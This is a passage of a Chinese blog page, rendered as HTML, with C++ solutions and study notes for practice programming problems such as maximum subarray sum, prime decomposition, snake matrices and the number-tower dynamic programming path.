class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最大子序列的和</span></span><br><span class="line"><span class="comment">//从左到右开始加，如果前面所加之和比本身还小，不如更新子序列从本身开始。辅助变量：当前子序列首位址，当前最大子序列和，实际最大子序列和，，实际子序列头，实际子序列尾。 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min -31457</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;m)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n=m.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> front=<span class="number">0</span>,rear=<span class="number">0</span>,tempsum=<span class="number">0</span>,sum=m[<span class="number">0</span>],tempfront=<span class="number">0</span>;<span class="comment">//初始化子序列最大和为首项 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(tempsum&gt;<span class="number">0</span>)&#123;<span class="comment">//前面子序列和大于0，继续使用 </span></span><br><span class="line">tempsum += m[i];</span><br><span class="line"><span class="keyword">if</span>(tempsum &gt; sum)&#123;<span class="comment">//加上该位置当前子序列和大于最大子序列和 </span></span><br><span class="line">front = tempfront;</span><br><span class="line">sum = tempsum;</span><br><span class="line">rear = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//前面子序列和小于0 </span></span><br><span class="line">tempfront = i;<span class="comment">//暂存序列首 </span></span><br><span class="line">tempsum = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tempsum &gt; sum)&#123;</span><br><span class="line">rear = i;</span><br><span class="line">front = i;</span><br><span class="line">sum = tempsum;</span><br><span class="line">&#125;<span class="comment">//全负情况，如-3 -2 -1 -4 -5 -6 -7 -8  </span></span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;front+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;rear+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">m</span><span class="params">(n)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">f</span>(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152211073.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152211073.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304152211073"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152235443.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152235443.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304152235443"></p><h3 id="偶数分解"><a href="#偶数分解" class="headerlink" title="偶数分解"></a>偶数分解</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304154153903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304154153903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304154153903"></p><blockquote><p>根据数论：如果一个数a不能被从2到sqrt(a)整除，则a为素数</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//偶数分解</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">divise</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">bool</span> flag=<span class="literal">false</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;(n/<span class="number">2</span>+<span class="number">1</span>);i++)&#123;</span><br><span class="line"><span class="type">int</span> j=n-i;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isPrime</span>(i)&amp;&amp;<span class="built_in">isPrime</span>(j)) &#123;</span><br><span class="line">cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">divise</span>(n)) cout&lt;&lt;<span class="string">&quot;不可分解&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160243142.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160243142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304160243142"></p><h3 id="蛇形矩阵"><a href="#蛇形矩阵" class="headerlink" title="蛇形矩阵"></a>蛇形矩阵</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160312122.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160312122.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304160312122"></p><p>看到这你都还不能自己写我只能送你四个大字，别看了</p><p>奇数行正序，偶数行逆序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//i为行 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;<span class="comment">// </span></span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">2</span>)&#123;<span class="comment">//偶数行 </span></span><br><span class="line">cout&lt;&lt;n*(i+<span class="number">1</span>)-j&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;n*i+j&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161753020.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161753020.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304161753020"></p><h3 id="计算第几天"><a href="#计算第几天" class="headerlink" title="计算第几天"></a>计算第几天</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161848661.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161848661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304161848661"></p><p>第二个样例输出是错的，应该是159</p><p>输入日期yyyy mm dd，输出是本年第几天。</p><blockquote><p>本题主要知识点：年份满足以下条件之一为闰年，2月有29天：</p><ul><li>年份能被4整除，不能被100整除</li><li>年份能被400整除</li></ul></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算第几天</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDouYear</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>((n%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;n%<span class="number">100</span>!=<span class="number">0</span>)||(n%<span class="number">400</span>==<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">whatday</span><span class="params">(<span class="type">int</span> year,<span class="type">int</span> month,<span class="type">int</span> day)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m[<span class="number">13</span>]=&#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line"><span class="type">int</span> sumday = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isDouYear</span>(year)) m[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;month;i++)&#123;</span><br><span class="line">sumday += m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sumday+day;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> year,month,day;</span><br><span class="line">cin&gt;&gt;year&gt;&gt;month&gt;&gt;day;</span><br><span class="line">cout&lt;&lt; <span class="built_in">whatday</span>(year,month,day);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304164607464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304164607464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240304164607464"></p><h3 id="数塔路径"><a href="#数塔路径" class="headerlink" title="数塔路径"></a>数塔路径</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155323524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155323524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240305155323524"></p><p>如果不懂可以先看下面letcode三道路径题</p><p>数塔中(i,j)来自于(i-1,j-1),(i-1,j)中的最大值，定长数组方便，这里用动态数组</p><blockquote><p>中间排了一个很久的错，push_back是压入向量，但是事先声明了向量会保存，什么意思呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n);<span class="comment">//错误来源</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dprow</span><span class="params">(i+<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">dprow[j]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">dp.<span class="built_in">push_back</span>(dprow);</span><br><span class="line">&#125;<span class="comment">//定义dp数组 </span></span><br></pre></td></tr></table></figure><p>声明dp数组时放入n个向量，然后dp.push_back的向量是在n个向量之后。应该直接<code>vector&lt;vector&lt;int&gt;&gt; dp;</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三角形最小路径和 </span></span><br><span class="line"><span class="comment">//push_back向vector里压入向量 ，每行第一个只能来自上一行第一个，每行最后一个只能来自上一行最后一个。 </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxpath</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;m)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = m.<span class="built_in">size</span>();</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dprow</span><span class="params">(i+<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">dprow[j]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">dp.<span class="built_in">push_back</span>(dprow);</span><br><span class="line">&#125;<span class="comment">//定义dp数组 </span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>]=m[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>) dp[i][<span class="number">0</span>]=m[i][<span class="number">0</span>]+dp[i<span class="number">-1</span>][<span class="number">0</span>];<span class="comment">//数塔最左边只来自上面的最左边</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(j==i) dp[i][j]=m[i][j]+dp[i<span class="number">-1</span>][j<span class="number">-1</span>];<span class="comment">//同理，最右边来自上面最右边</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+m[i][j];<span class="comment">//(i,j)来自于(i-1,j-1),(i-1,j)中的最大值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout&lt;&lt;dp[i][j]&lt;&lt;&quot; &quot;;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> maxest=dp[n<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[n<span class="number">-1</span>][i]&gt;maxest)&#123;</span><br><span class="line">maxest = dp[n<span class="number">-1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> maxest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;<span class="comment">//行数</span></span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; m; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">row</span><span class="params">(i+<span class="number">1</span>)</span></span>;<span class="comment">//每行i+1个元素 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">cin&gt;&gt;row[j];</span><br><span class="line">&#125;</span><br><span class="line">m.<span class="built_in">push_back</span>(row);<span class="comment">//向量压栈</span></span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="built_in">maxpath</span>(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155720759.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155720759.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240305155720759"></p><h3 id="字符统计"><a href="#字符统计" class="headerlink" title="字符统计"></a>字符统计</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305162019359.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305162019359.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240305162019359"></p><p>别看代码少，很多知识盲区</p><blockquote><p>首先cin不能读取换行符，如果非要使用cin，要用<code>char a;while(cin&gt;&gt;noskipws&gt;&gt;a;&amp;&amp;a!=&#39;.&#39;);</code>，不推荐，考试也记不起来</p><ul><li>getline(cin,str,’.’);以.为分隔符读取字符，前面的空格和换行符也都要读取，默认getline(cin,str)会读空格</li><li>getchar()读一个字符。</li></ul><p>易错点：字符比较时，’\n’和’.’必须用单引号，双引号会字符串末尾+’\0’，字符和字符串比较会转为整型比较并报错</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//字符统计</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string strs;</span><br><span class="line"><span class="type">int</span> skipnum=<span class="number">0</span>,atsum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">getline</span>(cin,strs,<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="comment">//cout&lt;&lt;strs;</span></span><br><span class="line"><span class="type">int</span> n=strs.<span class="built_in">length</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="type">char</span> str=strs[i];</span><br><span class="line"><span class="keyword">if</span>(str==<span class="string">&#x27;\n&#x27;</span>) skipnum++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(strs[i+<span class="number">1</span>]==<span class="string">&#x27;t&#x27;</span>) atsum++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;skipnum&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;atsum;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305163007582.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305163007582.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240305163007582"></p><h3 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170001031.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170001031.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240305170001031"></p><p>折半查找</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//猜数字</span></span><br><span class="line"><span class="comment">//折半查找，王道上有 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">halfseek</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> mid=n/<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> seeknum=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> low=<span class="number">0</span>,high=n;</span><br><span class="line"><span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">seeknum++;</span><br><span class="line"><span class="keyword">if</span>(mid==x) <span class="keyword">return</span> seeknum<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(x&gt;mid)&#123;</span><br><span class="line">low=mid+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">high=mid<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,x;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">cout&lt;&lt;<span class="built_in">halfseek</span>(n,x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170045851.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305170045851.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 